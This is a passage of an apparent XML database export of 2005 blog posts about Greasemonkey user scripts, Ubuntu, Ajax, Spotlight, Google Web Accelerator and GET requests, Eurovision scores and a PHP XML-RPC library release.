		<field name="body">&lt;p&gt;In &lt;a href=&quot;http://weblog.infoworld.com/udell/2005/03/30.html#a1205&quot;&gt;The architecture of intermediation&lt;/a&gt;, Jon Udell discusses the need for a mechanism for a high-level tool for adding custom features to web applications. In Jon's case, he wants to add a private bookmarks feature to &lt;a href=&quot;http://del.icio.us/&quot;&gt;del.icio.us&lt;/a&gt;. Jon thought about using a web proxy to intercept and modify del.icio.us pages, but ruled it out as too low-level.&lt;/p&gt;

&lt;p&gt;Jon, you need &lt;a href=&quot;http://greasemonkey.mozdev.org/&quot;&gt;Greasemonkey&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;The latest release of the swiss army knife of Firefox extensions adds support for cross-domain XMLHttpRequest calls from greasemonkey scripts. What that means is that you can create a user script (a short JavaScript that will be executed whenever your browser loads specific pages) that can then pull extra data in from another server. This new ability is described in the &lt;a href=&quot;http://greasemonkey.mozdev.org/authoring.html#specialfunctions&quot;&gt;greasemonkey documentation&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;I'm using this for my final year project, a decentralised web annotation system that lets you annotate pages, storing your annotations locally and then sharing your public annotations as a feed (similar to the way RSS aggregators work). The trick there is to run a local web server on some port, then have the Greasemonkey user script (eventually a full extension) communicate with that local server to store and retrieve data. I'm using Ruby on Rails' built in WEBrick server to prototype the service, and it's working a treat.&lt;/p&gt;

&lt;p&gt;This architecture could be easily adapted to add private bookmarks to del.icio.us - or to add any number of cool features to any number of other sites. Here's another example: Google's &lt;a href=&quot;http://desktop.google.com/&quot;&gt;Desktop Search&lt;/a&gt; integrates results from your local drive with the search results page on Google.  Using greasemonkey and a local web server tied in to OS X Tiger's &lt;a href=&quot;http://www.apple.com/macosx/tiger/spotlight.html&quot;&gt;Spotlight&lt;/a&gt; indexer, you could add this functionality to any search site you wanted to. Just be sure to lock down the web server to only serve requests from localhost, to avoid sharing search results for your data with anyone on the network who can see your machine.&lt;/p&gt;

&lt;p&gt;When people asked me &lt;a href=&quot;http://simon.incutio.com/archive/2005/03/18/quotes&quot; title=&quot;Choice SxSW quotes&quot;&gt;what I was excited about&lt;/a&gt; at SxSW, one of my answers was Greasemonkey. This kind of stuff is the reason why.&lt;/p&gt;</field>
		<field name="created">2005-03-30 18:53:07</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1478</field>
		<field name="title">Enter the hedgehog</field>
		<field name="slug">hedgehog</field>
		<field name="body">&lt;p&gt;The &lt;a href=&quot;http://www.ubuntulinux.org/&quot;&gt;Ubuntu&lt;/a&gt; community have released Hoary Hedgehog, otherwise known as Ubuntu 5.04. If you haven't tried Ubuntu yet, it's an excellent Linux distribution based on Debian with a strong focus on desktop usability. Unlike most Linux distros, Ubuntu comes with just one desktop manager (Gnome) and one obvious default application for each of the essentials: Firefox for browsing, OpenOffice for office work, Evolution for mail.&lt;/p&gt;

&lt;p&gt;That's not to say that other applications aren't available. Ubuntu's package management inherits from Debian, with the Synaptic package manager making downloading and installing new software as easy as searching for what you want and hitting a button. The key thing is that you don't have to start your journey with Linux by making random decisions (Gnome v.s. KDE for example). Ubuntu has more in common with Python's philosophy (There should be one-- and preferably only one --obvious way to do it) than Perl's.&lt;/p&gt;

&lt;p&gt;Best of all, Ubuntu has a Live CD similar to Knoppix which allows you to try out the distribution without installing a thing - just drop the live CD in to the drive on a x86 PC and reboot.&lt;/p&gt;

&lt;p&gt;You can grab Ubuntu from &lt;a href=&quot;http://www.ubuntulinux.org/download/&quot;&gt;a regional mirror&lt;/a&gt;. Torrent files are available for both the install and Live CDs.&lt;/p&gt;</field>
		<field name="created">2005-04-08 09:49:46</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1479</field>
		<field name="title">Flickr without the Flash</field>
		<field name="slug">lickr</field>
		<field name="body">&lt;p&gt;One of my favourite panels at &lt;acronym title=&quot;South by South West&quot;&gt;SxSW&lt;/acronym&gt; this year was &lt;a href=&quot;http://2005.sxsw.com/interactive/conference/panels/?action=show&amp;amp;id=IAP0062&quot;&gt;the Flash vs. HTML Game Show&lt;/a&gt;, in which a team of HTML/JavaScript gurus took on a team of Flash gurus showing off pre-prepared solutions to tasks set for the panel. One of the challenges was to come up with enhancements to &lt;a href=&quot;http://www.flickr.com/&quot;&gt;Flickr&lt;/a&gt; using the team's assigned technology.&lt;/p&gt;

&lt;p&gt;The JavaScript team were happy to admit that Flickr's use of Flash was extremely smart. In addition to the incredible &lt;a href=&quot;http://www.flickr.com/tools/organizr.gne&quot;&gt;Organizr&lt;/a&gt;, Flickr uses Flash to power the annotations attached to images. &lt;a href=&quot;http://www.massless.org/&quot;&gt;Chris Wetherell&lt;/a&gt; on the HTML team showed off a partial implementation of this feature, and emphasized that with a little more time it could duplicate the Flash implementation.&lt;/p&gt;

&lt;p&gt;I don't know if Neil Kandalgaonkar was at SxSW, but he's taken the inspired step of combining a JavaScript reimplementation of Flickr's annotations with &lt;a href=&quot;http://greasemonkey.mozdev.org/&quot;&gt;greasemonkey&lt;/a&gt;. The result is &lt;a href=&quot;http://brevity.org/code/mozilla/greasemonkey/lickr/&quot;&gt;Lickr&lt;/a&gt;, by far the most impressive userscript released to date. Lickr hooks in to Flickr, removes the Flash annotation interface entirely and replaces it with a HTML/JavaScript/Ajax  equivalent. Get this though... the JavaScript one is &lt;em&gt;better&lt;/em&gt; than the original Flash. It loads faster, feels smoother and allows you to open dozens of photos in new tabs without your browser slowing to a crawl.&lt;/p&gt;

&lt;p&gt;Be sure to read Neil's &lt;a href=&quot;http://brevity.org/code/mozilla/greasemonkey/lickr/&quot;&gt;notes&lt;/a&gt; on the implementation. He had to reverse engineer the communication between the Flash file and the backend server, and ended up producing a mini-JavaScript &lt;acronym title=&quot;Application Programming Interface&quot;&gt;API&lt;/acronym&gt; to manage the interactions.&lt;/p&gt;

&lt;p&gt;Neil also touches on the fascinating cultural issues brought up by userscripts:&lt;/p&gt;

&lt;blockquote cite=&quot;http://brevity.org/code/mozilla/greasemonkey/lickr/&quot;&gt;&lt;p&gt;Lately I've been considering Lickr as an experiment in web politics. Exactly how far can the users go in controlling a website? Right now I'm at the point where I can stop thinking about just duplicating Flickr; I can think about adding features.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;&lt;a href=&quot;http://persistent.info/archives/2005/03/01/gmail-searches&quot;&gt;Adding Persistent Searches to Gmail&lt;/a&gt; has already demonstrated new features enabled by userscripts, and that's evidently just the tip of the iceburg. Plans are underway to provide greasemonkey with its own persistence mechanism. Once that happens, the sky's the limit.&lt;/p&gt;</field>
		<field name="created">2005-04-10 03:29:46</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1480</field>
		<field name="title">Greasemonkey etiquette</field>
		<field name="slug">etiquette</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;&lt;a href=&quot;http://weblog.infoworld.com/udell/2005/04/11.html#a1212&quot;&gt;In Meme tracking with Greasemonkey&lt;/a&gt;, Jon Udell introduces a userscript which grabs the number of references from del.icio.us and bloglines and appends that information to the top of &lt;em&gt;every page you visit&lt;/em&gt;. To be fair on Jon, the version he has released defaults to only doing this for pages on Infoworld.com but modifying it to run on every web page is trivial.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;The obvious downside of this kind of script is the amount of additional web traffic it induces. Every page you load in your browser induces an extra &lt;acronym title=&quot;HyperText Transfer Protocol&quot;&gt;HTTP&lt;/acronym&gt; request to both del.icio.us and bloglines. Times that by several hundred users and those sites are going to be serving thousands of requests every minute.&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;Can this kind of thing scale? The Google toolbar retrieves the PageRank for every page you view, and the Alexa toolbar (and thousands of spyware applications) request information for every page viewed as well. The difference is that the developers host their own servers, and are responsible for their own bandwidth bills.&lt;/p&gt;

&lt;p id=&quot;p-3&quot;&gt;There are also very serious privacy implications involved in this kind of activity. Right now, Joshua Schachter's del.icio.us access logs are collecting a detailed history of Jon Udell's browsing history - and that of anyone else using the script.&lt;/p&gt;

&lt;p id=&quot;p-4&quot;&gt;This is a frustrating quandry, because the technique used in Jon's script can be extended in almost limitless ways. Sadly, in a world where bandwidth and server resources are limited such scripts must be approached with caution.&lt;/p&gt;</field>
		<field name="created">2005-04-11 17:27:22</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1481</field>
		<field name="title">Greasemonkey FUD</field>
		<field name="slug">fud</field>
		<field name="body">&lt;p&gt;Wow, that didn't take long. Via the &lt;a href=&quot;http://www.mozdev.org/pipermail/greasemonkey/2005-April/001154.html&quot; title=&quot;[Press] Navigating with Firefox: danger !&quot;&gt;Greasemonkey mailing list&lt;/a&gt;, Forrester Research have released a report entitled &lt;a href=&quot;http://www.forrester.com/Research/Document/Excerpt/0,7211,36708,00.html&quot; rel=&quot;nofollow&quot;&gt;Greasemonkey Primes Firefox For Embarrassment&lt;/a&gt;. I have no intention of paying the $49 asking price for the full 3 page report (!), but here's the executive summary:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.forrester.com/Research/Document/Excerpt/0,7211,36708,00.html&quot;&gt;&lt;p&gt;Eager Web users downloaded Firefox more than 25 million times in the 100 days following its public release - and they did it without waiting for IT or anyone else to tell them to. So it's safe to assume many of these self-directed go-getters are going to run out and download the latest Firefox extension, Greasemonkey, and start using it to streamline the way they browse. But IT managers beware: Greasemonkey will cause you nothing but headaches, and may even be a good reason to delay that Firefox pilot you're planning.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;For Microsoft's sake, let's hope Forrester don't find out about &lt;a href=&quot;http://www.daishar.com/blog/archives/2005/03/greasemonkey_fo.html&quot;&gt;GreasemonkIE&lt;/a&gt; ;) On a more serious note, tools like Greasemonkey are a fantastic way of fixing issues with the atrocious interfaces found in many &quot;enterprise&quot; web applications. Workers who use Greasemonkey to improve their productivity by fixing problems with internal applications should be applauded. I wonder if the Forrester report touches on the many benefits of browser-based site customisation. The title would suggest not.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Update:&lt;/strong&gt; For comparison, it's interesting to note that a &lt;a href=&quot;http://www.forrester.com/Research/Document/Excerpt/0,7211,36421,00.html&quot; title=&quot;What Corporate Buyers Need To Know About Firefox 1.0&quot;&gt;previous report&lt;/a&gt; from the same author cautiously commends Firefox for providing &lt;q cite=&quot;http://www.forrester.com/Research/Document/Excerpt/0,7211,36421,00.html&quot;&gt;some tangible benefits over Microsoft's Internet Explorer&lt;/q&gt; and suggests businesses &lt;q cite=&quot;http://www.forrester.com/Research/Document/Excerpt/0,7211,36421,00.html&quot;&gt;re-code all external-facing Web content to work with Firefox&lt;/q&gt;. With that in mind, crying &lt;acronym title=&quot;Fear, Uncertainty, Doubt&quot;&gt;FUD&lt;/acronym&gt; may be unwarranted.&lt;/p&gt;</field>
		<field name="created">2005-04-14 13:07:11</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1482</field>
		<field name="title">Safari 1.3 has a JavaScript Console</field>
		<field name="slug">console</field>
		<field name="body">&lt;p&gt;My single biggest complaint about Safari in the past has been its &lt;a href=&quot;http://simon.incutio.com/archive/2003/11/06/easytoggle&quot; title=&quot;easytoggle and debugging in Safari&quot;&gt;terrible support&lt;/a&gt; for JavaScript debugging. Safari 1.3 has just &lt;a href=&quot;http://weblogs.mozillazine.org/hyatt/archives/2005_04.html#007962&quot; title=&quot;Surfin&amp;apos; Safari: Safari 1.3&quot;&gt;been released&lt;/a&gt;, and tucked away in the &lt;a href=&quot;http://www.macosxhints.com/article.php?story=20030110063041629&quot;&gt;Debug menu&lt;/a&gt; is a brand new JavaScript console option. It's not as good as the Firefox equivalent (it throws up far too many &quot;Undefined value, line: 0&quot; errors for my liking) but it's a big step in the right direction.&lt;/p&gt;</field>
		<field name="created">2005-04-16 17:06:20</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1483</field>
		<field name="title">Why the term Ajax is useful</field>
		<field name="slug">useful</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;Software design patterns are useful mainly because they provide a shared vocabulary: rather than discussing the intimate details of a three layered application architecture, we say &quot;MVC&quot;. Rather than describing an object that tracks your progress while looping over a collection, we say &quot;Iterator&quot;.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;The same is true for &lt;a href=&quot;http://www.adaptivepath.com/publications/essays/archives/000385.php&quot;&gt;Ajax&lt;/a&gt;. While the techniques it describes have been around for years, grouping them under a single term is extremely valuable for raising the level of discussion about them. No longer will we have to explain XMLHttpRequest / hidden iframes / crazy cookie tricks in depth when discussing sites which pull fresh information from the server without reloading the whole page. Instead, we can say &quot;Ajax&quot; and move on to more interesting things.&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;Matthew Haughey says it's &lt;a href=&quot;http://a.wholelottanothing.org/2005/04/note_to_geeks_l.html&quot; title=&quot;Note to geeks: look beyond the end of your nose&quot;&gt;all about marketing&lt;/a&gt;. I disagree; it's about smarter and more effective conversations.&lt;/p&gt;</field>
		<field name="created">2005-04-19 01:15:58</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1484</field>
		<field name="title">A Firefox observation</field>
		<field name="slug">firefox</field>
		<field name="body">&lt;p&gt;There are (to my knowledge) around 80 people on my undergraduate computer science course. Of those 80, I know of at least &lt;del&gt;four&lt;/del&gt;&lt;ins&gt;five&lt;/ins&gt; who's final year project involves writing a Firefox extension of some sort. That's 1 in &lt;del&gt;20&lt;/del&gt;&lt;ins&gt;16&lt;/ins&gt;.&lt;/p&gt;

&lt;p&gt;Meanwhile, the &lt;a href=&quot;http://www.spreadfirefox.com/fifty.html&quot; title=&quot;Firefox: Blazing a Trail to 50,000,000&quot;&gt;race to fifty million downloads&lt;/a&gt; continues. Check out the source code for the counter on that page for some smart use of Ajax.&lt;/p&gt;</field>
		<field name="created">2005-04-28 17:52:02</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1485</field>
		<field name="title">Giving away the index</field>
		<field name="slug">spotlight</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;My final year project is due in two weeks, and I'm going to be running on silent for most of them. I have, however, upgraded to Tiger and playing with &lt;a href=&quot;http://www.apple.com/macosx/features/spotlight/&quot;&gt;Spotlight&lt;/a&gt; has given me plenty to think about.&lt;/p&gt;

&lt;h4&gt;Giving away the index&lt;/h4&gt;

&lt;p id=&quot;p-1&quot;&gt;The great benefit of having an electronic version of a book you own in dead-tree format to hand is that you can search it. Publishers generally don't hand out free digital copies because, well, they want you to buy the books, not freely distribute electronic copies.&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;The thing is, you don't need a digital copy of a book to be able to search it; you just need a full-text index of it (if you don't understand what this means, go and read Tim Bray's series &lt;a href=&quot;http://www.tbray.org/ongoing/When/200x/2003/07/30/OnSearchTOC&quot;&gt;On Search&lt;/a&gt;). An index isn't enough to reconstruct the book, but it &lt;em&gt;is&lt;/em&gt; enough to answer questions like &quot;on what pages of &lt;cite&gt;Eric Meyer on CSS&lt;/cite&gt; are float layouts discussed?&quot;&lt;/p&gt;

&lt;p id=&quot;p-3&quot;&gt;Imagine if technical publishers made binary full-text index files of their titles available for download, for free in some kind of open standard format. Readers could query them using Spotlight or similar technologies, and gain the ability to search the titles they own all without needing to rely on centralised, artificially limited services  such as Amazon's &lt;a href=&quot;http://www.amazon.com/exec/obidos/tg/browse/-/10197021/103-7492634-0996655&quot;&gt;Search Inside the Book&lt;/a&gt;.&lt;/p&gt;

&lt;p id=&quot;p-4&quot;&gt;O'Reilly, I'm &lt;a href=&quot;http://radar.oreilly.com/&quot; title=&quot;O&amp;apos;Reilly Radar&quot;&gt;looking at you&lt;/a&gt;.&lt;/p&gt;

&lt;h4&gt;Full-text phishing&lt;/h4&gt;

&lt;p id=&quot;p-5&quot;&gt;On a darker note, one thing about Spotlight that has given me pause is the immense ease with which it can uncover passwords saved amongst my email. Lost password reminders, new account details, invitations to sign up for services - they're all hidden away in my mail archive. Spotlight makes it trivial to dig them back up again, and offers the APIs for applications to do so as well. Combine this with a piece of spyware / some trojan horse and you've got the ultimate vector for phishing attacks.&lt;/p&gt;

&lt;p id=&quot;p-6&quot;&gt;This problem isn't limited to Macs either; Google and MSN's Desktop Search engines could be used for much the same purpose, and full-text search is bound to end up built in to Windows sooner or later. For the moment, the safest thing to do is either delete those pesky emails or move them to a folder that is excluded from Spotlight's index. Somehow I doubt many people will think to take such precautions.&lt;/p&gt;

&lt;p id=&quot;p-7&quot;&gt;And with that off my chest, it's time to get back to my dissertation.&lt;/p&gt;</field>
		<field name="created">2005-05-04 01:16:45</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1486</field>
		<field name="title">Fighting RFCs with RFCs</field>
		<field name="slug">bad</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;Google's recently released &lt;a href=&quot;http://webaccelerator.google.com/&quot;&gt;Web Accelerator&lt;/a&gt; apparently has some &lt;a href=&quot;http://www.37signals.com/svn/archives2/google_web_accelerator_hey_not_so_fast_an_alert_for_web_app_designers.php&quot; title=&quot;Google Web Accelerator: Hey, not so fast - an alert for web app designers&quot;&gt;scary side-effects&lt;/a&gt;. It's been spotted pre-loading links in password-protected applications, which can amount to clicking on every &quot;delete this&quot; link  -  bypassing even the JavaScript prompt you carefully added to give people the chance to think twice.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;&quot;Aah,&quot; I hear you cry, &quot;but &lt;a href=&quot;http://www.ietf.org/rfc/rfc2616.txt&quot; title=&quot;Hypertext Transfer Protocol -- HTTP/1.1&quot;&gt;RFC 2616&lt;/a&gt; clearly states that you shouldn't perform state changing operations with a GET or HEAD method!&quot;&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.ietf.org/rfc/rfc2616.txt&quot;&gt;&lt;p id=&quot;p-2&quot;&gt;In particular, the convention has been established that the GET and
   HEAD methods SHOULD NOT have the significance of taking an action
   other than retrieval.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p id=&quot;p-3&quot;&gt;I'll see your RFC 2616 and raise you an &lt;a href=&quot;http://www.ietf.org/rfc/rfc2119.txt&quot;&gt;RFC 2119&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.ietf.org/rfc/rfc2119.txt&quot;&gt;&lt;p id=&quot;p-4&quot;&gt;
SHOULD NOT   This phrase, or the phrase &quot;NOT RECOMMENDED&quot; mean that
   there may exist valid reasons in particular circumstances when the
   particular behavior is acceptable or even useful, but the full
   implications should be understood and the case carefully weighed
   before implementing any behavior described with this label.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p id=&quot;p-5&quot;&gt;Hiding your dangerous delete links behind an authentication scheme is a perfectly acceptable compromise. Web Accelerator is &lt;a href=&quot;http://www.tbray.org/ongoing/When/200x/2002/09/10/Good%20Technology&quot; title=&quot;Broken As Designed&quot;&gt;B.A.D&lt;/a&gt;.&lt;/p&gt;

&lt;p id=&quot;p-6&quot;&gt;&lt;strong&gt;Update:&lt;/strong&gt; Be sure to read the &lt;a href=&quot;http://simon.incutio.com/archive/2005/05/06/bad#comments&quot;&gt;excellent discussion&lt;/a&gt; brewing in the comments. Hiding behind authentication may not be as acceptable a compromise as I had first thought.&lt;/p&gt;

&lt;p id=&quot;p-7&quot;&gt;&lt;strong&gt;Update 2:&lt;/strong&gt; If you haven't been following the comments, I've had a change of heart. Even in the absence of Web Accelerator, hiding behind authentication leaves your application open to some very nasty security vulnerabilities (malicious pages can piggy-back your session and cause havoc making dangerous GET calls). I still think the RFC language covers people who thought long and hard before implementing a dangerous GET, but if you haven't thought about security and accelerating caching proxies such as Web Accelerator you haven't been thinking hard enough.&lt;/p&gt;

&lt;p id=&quot;p-8&quot;&gt;&lt;strong&gt;Update 3:&lt;/strong&gt; So, it turns out using POST is no defence at all against &lt;a href=&quot;http://www.squarefree.com/securitytips/web-developers.html#CSRF&quot;&gt;CSRF&lt;/a&gt; attacks. I've been learning a whole bunch of interesting stuff this evening.&lt;/p&gt;</field>
		<field name="created">2005-05-06 20:39:45</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1487</field>
		<field name="title">Eurovision scores</field>
		<field name="slug">eurovision</field>
		<field name="body">&lt;p&gt;Aah sweet &lt;a href=&quot;http://www.eurovision.tv/&quot;&gt;Eurovision&lt;/a&gt;. This time last year I was in Kansas, no one had even heard of it and I was forced to watch it over RealPlayer as it wasn't being carried by any of the TV channels. This year, we've had a Eurovision party. Here are our scores:&lt;/p&gt;

&lt;pre&gt;   Country                  Simon   &lt;a href=&quot;http://www.natbat.co.uk/&quot;&gt;Nat&lt;/a&gt;     &lt;a href=&quot;http://www.sushispoon.co.uk/&quot;&gt;Tony&lt;/a&gt;    &lt;a href=&quot;http://www.mooncalf.me.uk/&quot;&gt;Andy&lt;/a&gt;    Average
===================================================================
1  Hungary                  7       8       8       7       7.5
2  UK                       3       10      4       3       5.0
3  Malta                    6       8       6       8       7.0
4  Romania                  7       4       9       6       6.5
5  Norway                   9       10      5       8       8.0
6  Turkey                   7       7       8       7       7.25
7  Moldova                  10      8       10      5       8.25
8  Albania                  6       4       4       4       4.5
9  Cyprus                   3       5       3       4       3.75
10 Spain                    4       6       6       5       5.25
11 Israel                   6       6       6       6       6.0
12 Serbia &amp;amp; Montenegro      5       9       6       6       6.5
13 Denmark                  5       7       6       6       6.0
14 Sweden                   7       9       8       6       7.5
15 F.Y.R. Macedonia         3       4       4       3       3.5
16 Ukraine                  6       7       8       6       6.75
17 Germany                  7       8       6       8       7.25
18 Croatia                  5       7       4       6       5.5
19 Greece                   8       7       8       6       7.25
20 Russia                   6       7       9       6       7.0
21 Bosnia &amp;amp; Herzegovina     9       9       10      8       9.0
22 Switzerland              5       4       6       7       5.5
23 Latvia                   4       4       4       6       4.5
24 France                   3       4       5       4       4.0
   Averages                 5.875   6.75    6.375   5.875   6.21875
&lt;/pre&gt;

&lt;p&gt;I'm sure the official results will be &lt;a href=&quot;http://en.wikipedia.org/wiki/Eurovision_Song_Contest_2005&quot; title=&quot;Eurovision Song Contest 2005&quot;&gt;up on Wikipedia&lt;/a&gt; within minutes of their announcement.&lt;/p&gt;</field>
		<field name="created">2005-05-21 22:06:50</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1488</field>
		<field name="title">Testing a new version of IXR</field>
		<field name="slug">ixr</field>
		<field name="body">&lt;p&gt;Almost two years to the day since the last release, I've put together a new version of &lt;acronym title=&quot;Incutio XML-RPC Library&quot;&gt;IXR&lt;/acronym&gt;, my &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; &lt;acronym title=&quot;XML Remote Procedure Calls&quot;&gt;XML-RPC&lt;/acronym&gt; library. I haven't published it on &lt;a href=&quot;http://scripts.incutio.com/xmlrpc/&quot; title=&quot;The Incutio XML-RPC Library&quot;&gt;the site&lt;/a&gt; just yet as I want to make sure any bugs are ironed out first, but you can grab a copy here:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://scripts.incutio.com/xmlrpc/tests/IXR_Library.inc.php.txt&quot;&gt;IXR version 1.7 (beta)&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;It's mostly a bug fix release, although it also includes &lt;a href=&quot;http://trac.wordpress.org/log/trunk/wp-includes/class-IXR.php&quot;&gt;some changes&lt;/a&gt; made by the WordPress guys who have been maintaining their own fork since January. I've filed &lt;a href=&quot;http://trac.wordpress.org/ticket/1400&quot; title=&quot;Ticket #1400 WordPress should use the latest version of IXR&quot;&gt;a bug&lt;/a&gt; asking them to take a look at the new version and maybe roll it in to their codebase.&lt;/p&gt;

&lt;p&gt;If you use &lt;acronym title=&quot;Incutio XML-RPC Library&quot;&gt;IXR&lt;/acronym&gt; for anything it would be great if you could run this new version through its paces. Send any bug reports to &lt;a href=&quot;http://simon.incutio.com/contact/&quot; title=&quot;My contact form&quot;&gt;the usual address&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;A big thanks to everyone who sent in bug reports and patches.&lt;/p&gt;</field>
		<field name="created">2005-05-23 02:58:39</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1489</field>
		<field name="title">Fixing web applications with Greasemonkey</field>
		<field name="slug">fixing</field>
		<field name="body">&lt;p&gt;In &lt;a href=&quot;http://simon.incutio.com/archive/2005/04/14/fud&quot;&gt;Greasemonkey FUD&lt;/a&gt;, I highlighted the importance of Greasemonkey as a tool for fixing interface problems in &quot;enterprise&quot; web applications. DJ Adams has &lt;a href=&quot;https://www.sdn.sap.com/sdn/weblogs.sdn?blog=/pub/wlg/1669&quot;&gt;done exactly that&lt;/a&gt; for OSS Notes, part of the SAP service portal. His &lt;a href=&quot;http://www.pipetree.com/~dj/2005/05/OssNoteFix/ossnotefix.user.js&quot; title=&quot;ossnotefix.user.js&quot;&gt;user script&lt;/a&gt; ditches the frames in the interface, makes the page title more useful and adds hyperlinks to other note references on the page - significantly improving the user experience in less than 40 lines of code. The improvements are clearly explained in the accompanying &lt;a href=&quot;http://www.pipetree.com/~dj/2005/05/OssNoteFix/screencast.html&quot;&gt;screencast&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Spotted &lt;a href=&quot;http://www.mozdev.org/pipermail/greasemonkey/2005-May/002393.html&quot; title=&quot;[Greasemonkey] GM script for SAP&quot;&gt;via Jeremy&lt;/a&gt; on the Greasemonkey mailing list.&lt;/p&gt;</field>
		<field name="created">2005-05-24 01:59:40</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1490</field>
		<field name="title">Stuart's book</field>
		<field name="slug">book</field>
		<field name="body">I meant to mention this earlier, but Stuart's book, &lt;a href=&quot;http://www.sitepoint.com/books/dhtml1/&quot;&gt;DHTML Utopia: 
Modern Web Design Using JavaScript &amp;amp; DOM&lt;/a&gt;, has been published.

I worked as a technical editor on the book, and I'm proud to have been associated with it. Don't worry about the hairy title (apparently you have to have DHTML in it or bookshops won't know where to put it / people won't know what it's about), the inside is pure gold.

In their usual style, SitePoint have posted &lt;a href=&quot;http://www.sitepoint.com/article/dhtml-utopia-modern-web-design&quot;&gt;the first four chapters online&lt;/a&gt; for your perusal so you don't have to take my word for it, you can try it out for yourself.</field>
		<field name="created">2005-06-03 13:44:02</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1491</field>
		<field name="title">Staying social</field>
		<field name="slug">social</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;June is finals month, but the call of &lt;a href=&quot;http://www.atmedia2005.co.uk/&quot;&gt;@media 2005&lt;/a&gt; is hard to resist. I won't be attending the actual conference (sadly my student budget doesn't stretch that far) but I'll be in London on Saturday the 11th to ride on the coat-tails of the conference.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;PPK (yes, &lt;a href=&quot;http://www.quirksmode.org/&quot; title=&quot;QuirksMode&quot;&gt;&lt;em&gt;that&lt;/em&gt;&lt;/a&gt; PPK) is hosting a &lt;a href=&quot;http://www.quirksmode.org/blog/archives/2005/06/11_june_london.html&quot;&gt;JavaScript get-together&lt;/a&gt; in the afternoon at a Thames-side pub; confirmed attendees so far are PPK, myself, Stuart Langridge, Dean Edwards and Jeremy Keith but anyone else who wants to set the JavaScript world to rights is more than welcome to attend.&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;Planning a little further ahead, I'll be in and around San Francisco from the 11th to the 16th of July. My diary is more or less open at the moment, so if there's anything fun going on I'd love to hear about it.&lt;/p&gt;

&lt;p id=&quot;p-3&quot;&gt;&lt;strong&gt;Update:&lt;/strong&gt; I almost forgot, I'm also attending the &lt;a href=&quot;http://www.perfectpath.co.uk/wiki/index.php/London_Geek_Dinner_June_7th_2005&quot;&gt;London Geek Dinner&lt;/a&gt; on the 7th of June. If you're interested, there are still 12 places left (out of 200).&lt;/p&gt;</field>
		<field name="created">2005-06-03 13:56:33</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1492</field>
		<field name="title">Tweaking Wikipedia</field>
		<field name="slug">wikipedia</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;Does anyone know why &lt;a href=&quot;http://en.wikipedia.org/&quot;&gt;Wikipedia&lt;/a&gt; displays a redirected page at the same &lt;acronym title=&quot;Universal Republic of Love&quot;&gt;URL&lt;/acronym&gt; rather than using a proper &lt;acronym title=&quot;HyperText Transfer Protocol&quot;&gt;HTTP&lt;/acronym&gt; redirect? Case in point: &lt;a href=&quot;http://en.wikipedia.org/wiki/Topics_in_human-computer_interaction&quot;&gt;Topics in human-computer interaction&lt;/a&gt; actually displays the content from &lt;a href=&quot;http://en.wikipedia.org/wiki/List_of_human-computer_interaction_topics&quot;&gt;List of human-computer interaction topics&lt;/a&gt; (that's my next exam topic) - the same content appears at two different &lt;acronym title=&quot;Universal Republic of Love&quot;&gt;URL&lt;/acronym&gt;s. Yuck. Here's a Greasemonkey script to fix it: &lt;a href=&quot;http://simon.incutio.com/code/greasemonkey/wikipedia-redirect.user.js&quot;&gt;wikipedia-redirect.user.js&lt;/a&gt;.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;While I'm at it, Wikipedia's search function is painfully slow. Here's another user script which changes their search button to search the site using Google instead. It also swaps the positions of the &quot;Search&quot; and &quot;Go&quot; buttons, and makes &quot;Search&quot; the default action for the form: &lt;a href=&quot;http://simon.incutio.com/code/greasemonkey/wikipedia-googlesearch.user.js&quot;&gt;wikipedia-googlesearch.user.js&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2005-06-06 18:13:44</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1493</field>
		<field name="title">LUG Radio Live</field>
		<field name="slug">lugradiolive</field>
